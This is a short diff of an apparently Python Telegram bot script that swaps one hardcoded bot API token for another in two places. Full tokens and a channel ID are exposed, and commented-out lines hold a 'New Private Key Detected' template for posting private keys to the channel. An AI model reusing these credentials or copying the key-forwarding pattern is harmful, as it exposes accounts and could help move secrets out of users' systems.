@@ -64,7 +64,7 @@ def send_telegram_message(token, chat_id, message):
         print(f"An error occurred: {e}")
 
 # --- Configuration ---
-BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
+BOT_TOKEN = "8746690272:AAHJJTT9apdfqLlNxG9qYNCm-ipm-e-xg24"
 CHANNEL_ID = -1003719196426
 #PRIVATE_KEY = ""
 #TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"
@@ -251,7 +251,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     # ⚠️ INSERT YOUR ACTIVE BOT API TOKEN FROM BOTFAHER HERE
-    BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
+    BOT_TOKEN = "8746690272:AAHJJTT9apdfqLlNxG9qYNCm-ipm-e-xg24"
 
     application = Application.builder().token(BOT_TOKEN).build()
 
